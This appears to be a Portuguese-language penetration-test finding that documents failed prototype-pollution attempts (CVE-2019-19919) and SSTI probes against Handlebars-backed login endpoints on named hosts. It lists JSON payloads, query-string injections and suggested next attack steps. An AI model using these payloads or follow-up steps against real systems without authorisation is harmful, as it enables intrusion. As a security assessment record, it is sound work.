# F-016 CVE-2019-19919 — Handlebars Prototype Pollution RCE (NÃO CONFIRMADO)

**Alvo**: api-beta.stormapplications.com, mng.stormapplications.com (/admin/login, /api/login)
**Severidade**: N/A (não confirmado)
**Timestamp**: 2026-08-23T14:20:00Z
**CVE**: CVE-2019-19919 (CVSS 9.8)

## Descrição
Handlebars < 4.3.0 é vulnerável a Prototype Pollution levando a RCE via `__proto__` e `__defineGetter__`. O backend Discloud usa Handlebars com triple-stash `{{{guild.*}}}` confirmado em F-012.

## Testes Realizados

### 1. POST /admin/login com Prototype Pollution (api-beta)
```bash
# Payload: {"__proto__":{"admin":true}}
# Resposta: {"code":"ADMIN_AUTH_REQUIRED"} HTTP 403

# Payload: {"constructor":{"prototype":{"admin":true}}}
# Resposta: {"code":"ADMIN_AUTH_REQUIRED"} HTTP 403

# Payload: {"__proto__":{"type":"Object","data":{"constructor":{"prototype":{"__proto__":{"type":"Object"}}}}}}
# Resposta: {"code":"ADMIN_AUTH_REQUIRED"} HTTP 403

# Payload: {"__proto__":{"toString":{"constructor":{"prototype":{"test":"test"}}}}}
# Resposta: {"code":"ADMIN_AUTH_REQUIRED"} HTTP 403

# Payload: {"username":"admin","password":"admin","__proto__":{"isAdmin":true}}
# Resposta: {"code":"ADMIN_AUTH_REQUIRED"} HTTP 403

# Payload: {"username":{"__proto__":{"admin":true}},"password":"admin"}
# Resposta: {"code":"ADMIN_AUTH_REQUIRED"} HTTP 403

# Payload: {"username":"admin","password":{"__proto__":{"admin":true}}}
# Resposta: 502 Bad Gateway (transiente, não reproduzível)
```
A maioria dos payloads retorna `ADMIN_AUTH_REQUIRED`. Um payload específico (`password` como objeto com `__proto__`) causou 502 Bad Gateway em uma tentativa, mas não foi reproduzível (pode ser transiente ou rate limiting).

### 2. POST /api/login com Prototype Pollution (api-beta e mng)
```bash
# api-beta: GET /api/login retorna página Handlebars com {{{guild.*}}}
# POST /api/login com qualquer payload → {"code":"NOT_FOUND"} HTTP 404
# GET /api/login com __proto__[admin]=true na query → mesma página (params ignorados)
```
POST /api/login não é endpoint de login — é callback OAuth (só aceita GET).

### 3. Testes de SSTI via query parameters
```bash
# state={{7*7}} guild → sem reflexão no HTML
# error={{7*7}} → sem reflexão
# guild[name]=INJECTED → sem reflexão
# code={{7*7}} → sem reflexão
```
Nenhum parâmetro de query é refletido no template Handlebars. As variáveis do template (`guild.*`) vêm exclusivamente da API do Discord.

## Resultado
**NÃO CONFIRMADO**. Prototype Pollution não alterou respostas dos endpoints testados.
- O Handlebars triple-stash `{{{guild.*}}}` está presente, mas as variáveis vêm do Discord API, não de input do usuário
- Nenhum parâmetro de request flui para o contexto do template
- O middleware `ADMIN_AUTH_REQUIRED` bloqueia qualquer processamento em /admin/login antes de chegar ao handler de login

## Impacto
Sem confirmação de Prototype Pollution ou SSTI. O vetor persiste se:
1. Um bypass do `ADMIN_AUTH_REQUIRED` for encontrado
2. Um fluxo de input do usuário para o Handlebars for descoberto
3. Um servidor Discord malicioso controlar `guild.name`/`guild.banner` (XSS via {{{ }}})

## Recomendação
- Testar com servidor Discord controlado pelo operador para XSS via guild.name
- Buscar outros endpoints que usem Handlebars com input do usuário
- Se acesso admin for obtido, testar Prototype Pollution no contexto de template conhecido
